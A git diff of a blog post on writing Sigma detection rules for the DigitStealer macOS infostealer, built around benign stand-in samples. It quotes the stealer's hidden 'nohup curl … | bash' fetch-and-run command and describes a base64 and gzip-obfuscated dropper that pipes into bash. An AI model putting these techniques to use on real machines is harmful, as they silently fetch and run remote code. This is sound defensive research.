@@ -28,12 +28,13 @@ image:
 
 ## Introduction
 
-So a few days ago [Thijs Xhaflaire](https://www.linkedin.com/in/thijs-xhaflaire-290b63a5/?originalSubdomain=nl) of Jamf Threat Labs dropped a [super awesome blog](https://www.jamf.com/blog/jtl-digitstealer-macos-infostealer-analysis/) about a new JXA-based macOS infostealer, DigitStealer. This blog provides an incredibly informative write up of the key behavious exhibited by this flavour of macOS stealer, and highlights some of the specifics that differ from previous stealers. (Finally, one that's not AMOS.)
+So on November 13 2025 [Thijs Xhaflaire](https://www.linkedin.com/in/thijs-xhaflaire-290b63a5/?originalSubdomain=nl) of Jamf Threat Labs dropped a [super awesome blog](https://www.jamf.com/blog/jtl-digitstealer-macos-infostealer-analysis/) about a new JXA-based macOS infostealer, DigitStealer. This blog provides an incredibly informative write up of the key behavious exhibited by this flavour of macOS stealer, and highlights some of the specifics that differ from previous stealers. (Finally, one that's not AMOS.)
 
 While reading this blog, I asked myself a series of questions. Namely:
 1. Do my current detectors fire on any of this activity?
 2. If they do, can my detector logic be improved?
 3. What is the best way to create sigma rules for this observed activity with my limited tooling? (I'll expand on this.)
+    - A/N: While writing this blog, Nebulock dropped their blog on [coreSigma](https://nebulock.io/blog/coresigma-expanding-sigma-detection-for-macos), an effort to expand the macOS sigma compatibility by building up a macos ESF pipeline. Keep an eye out on that because I'll surely be utilizing it in the future.
 
 We will be focusing on quesiton three for the duration of this blog.
 
@@ -50,9 +51,9 @@ This was while idle:
 ![image](/assets/img/digitstealer/pipain.png){: .w-75 .shadow .rounded-10 }
 _He was trying his best_
 
->A/N: This was true at the time of this analysis. In the middle of writing this blog I have since spun up an ELK stack bacause Splunk's macOS ingesiton made me very sad. Further blogs will utilize ELK.
+>A/N: This was true at the time of this analysis. In the middle of writing this blog I have since spun up an ELK stack bacause Splunk's macOS ingesiton made me very sad. Further blogs will utilize ELK. 
 
-With all of these limitations, I still had a task to complete. So how did I get it done? I created some fake malware samples meant to mimic the observed digitstealer activity that ultimately just prints some `hello world`'s and creates some files on disk. I ran my fake malware while using one of my favourite tools, [MacMonitor](https://github.com/Brandon7CC/mac-monitor) (thanks [Brandon Dalton](https://github.com/Brandon7CC)), to see the resulting host telemetry to create my sigma rules, then used [sigma-esf](https://github.com/bradleyjkemp/sigma-esf) to test these sigma rules against my benign samples.
+With all of these limitations, I still had a task to complete. So how did I get it done? I created some fake malware samples meant to mimic the observed digitstealer activity that ultimately just prints some `hello world`'s and creates some files on disk. I ran my fake malware while using one of my favourite tools, [MacMonitor](https://github.com/Brandon7CC/mac-monitor) (thanks [Brandon Dalton](https://github.com/Brandon7CC)), to see the resulting host telemetry to create my sigma rules, then used [sigma-esf](https://github.com/bradleyjkemp/sigma-esf) to test these sigma rules against my benign samples. (This last part is the bit I will be replacing with ELK and coreSigma dowßn the line.)
 
 ## The Observed Activity
 ### The Dropper
@@ -123,18 +124,14 @@ nohup curl -fsSL [malicious URL] | bash >/dev/null 2>&1 &
 
 There were a few burning questions I needed to answer which would motivate which parts of this activity I would mimic. First, I wanted to know if dragging the `.msi` file into terminal would count as an interactive commandline session, and whether or not that means I would not see the initial `curl` at all in the resulting telemetry. Next, if I did see it in the telem, does it retain the whole command or does it split the commands up at the pipes?
 
-For example, when a command is run on a macOS host that utilizes pipes like this: `cat [some file] | grep iE 'some pattern' | sort | uniq`, you usually do not get that whole commandline as a single log event, you get four separate PIDs for `cat [some file]`, `grep -iE 'some pattern'`, `sort`, and `uniq`. The saving grace is they will all have the same group ID. Sometimes shown as `GID` or `PGID`. 
+For example, when a command is run on a macOS host that utilizes pipes like this: `cat [some file] | grep -iE 'some pattern' | sort | uniq`, you usually do not get that whole commandline as a single log event, you get four separate PIDs for `cat [some file]`, `grep -iE 'some pattern'`, `sort`, and `uniq`. The saving grace is they will all have the same group ID. Sometimes shown as `GID` or `PGID`. 
 
 >You can find more information about macOS's weird PIDs and process forks in my other blog post [Basic macOS Malware Analysis](https://izzyboop.com/posts/MacOS-Static-Malware-Analysis-Techniques/).
 {: .prompt-info :}
 
 Further, when a commandline is executed resulting from a previous payload being piped to `bash`, is `bash` the parent process? Much in that same vein, when the commandline has several pieces that get split apart like in my above example, do they all have the same parent process, or are they a chained parent/child relationship? These are questions I was fairly sure I knew the answer to, but wanted to see it for myself. 
 
-Let's start mimicking this activity. The best way to do that which made the most sense to me was to work backwards. Starting from the back I took one of the `nohup curl` commands and made it point to some benign applescript on my github (we will review this in the next section) then used [CyberChef](https://gchq.github.io/CyberChef/) to `gzip` it then `base64` encode it:
-
-![image](/assets/img/digitstealer/b64payload.png){: .shadow .rounded-10 }
-
-As you can see, I took the following commandline which points to `helloworld.applescript` on my github...
+Let's start mimicking this activity. The best way to do that which made the most sense to me was to work backwards. Starting from the back I took one of the `nohup curl` commands and made it point to some benign applescript (`helloworld.applescript`) on my github which we will review in the next section...
 
 {% raw %}
 ```bash
@@ -147,7 +144,11 @@ sleep 1
 {: .nolineno }
 {% endraw %}
 
-... and sent it through `gzip` and `base64 encode` to get an encoded payload. I then wrapped this with `echo`, `base64 -d`, `gunzip`, and `bash` and pushed it to my github as `dropper.sh`. This will be the file pulled down by my version of `Drag Into Terminal.msi`.
+...then used [CyberChef](https://gchq.github.io/CyberChef/) to `gzip` it then `base64` encode it:
+
+![image](/assets/img/digitstealer/b64payload.png){: .shadow .rounded-10 }
+
+I then wrapped this with `echo`, `base64 -d`, `gunzip`, and `bash` and pushed it to my github as `dropper.sh`. This will be the file pulled down by my version of `Drag Into Terminal.msi`.
 
 {% raw %}
 ```bash
